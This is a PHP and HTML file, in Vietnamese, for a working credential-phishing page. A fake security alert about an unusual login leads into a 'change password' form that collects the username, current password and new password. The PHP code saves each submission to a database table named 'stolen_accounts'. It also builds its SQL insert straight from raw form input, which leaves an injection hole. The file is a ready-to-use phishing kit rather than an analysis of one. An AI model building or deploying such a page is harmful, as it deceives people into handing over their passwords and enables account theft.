<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "xss";

$mysqli = new mysqli($servername, $username, $password, $dbname);
if ($mysqli->connect_error) {
    die("Kết nối thất bại: " . $mysqli->connect_error);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $new_password = $_POST['new_password'];

    $mysqli->query("
    INSERT INTO stolen_accounts (username, password, new_password, created_at)
    VALUES ('$username', '$password', '$new_password', NOW())
    ");
    header("Location: submit.php");
    exit();
}
?>
<!doctype html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Đổi mật khẩu</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      display: flex;
      gap: 40px;
      align-items: center;
    }
    .warning {
      max-width: 300px;
      color: #721c24;
      background-color: #f8d7da;
      border: 1px solid #f5c6cb;
      padding: 20px;
      border-radius: 8px;
      font-size: 16px;
      line-height: 1.5;
      font-weight: bold;
    }
    .login-box {
      background: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      width: 350px;
      text-align: center;
    }
    .login-box h2 {
      margin-bottom: 20px;
      font-size: 22px;
      font-weight: bold;
      color: #1c1e21;
    }
    .login-box input {
      width: 91%;
      padding: 14px;
      margin: 10px 0;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 16px;
    }
    .login-box button {
      width: 100%;
      padding: 14px;
      background: #0b5fce;
      border: none;
      border-radius: 6px;
      color: white;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
    }
    .login-box button:hover {
      background: #0b5fce;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Cảnh báo -->
    <div class="warning">
      ⚠️ Phát hiện đăng nhập bất thường vào tài khoản của bạn.<br><br>
      🔐 Đổi mật khẩu ngay để bảo vệ tài khoản!
    </div>

    <!-- Form đổi mật khẩu -->
    <div class="login-box">
      <h2>Đổi mật khẩu</h2>
      <form method="POST">
        <input type="text" name="username" placeholder="Tên đăng nhập" required>
        <input type="password" name="password" placeholder="Mật khẩu hiện tại" required>
        <input type="password" name="new_password" placeholder="Mật khẩu mới" required>
        <button type="submit">Đổi mật khẩu</button>
      </form>
    </div>
  </div>
</body>
</html>
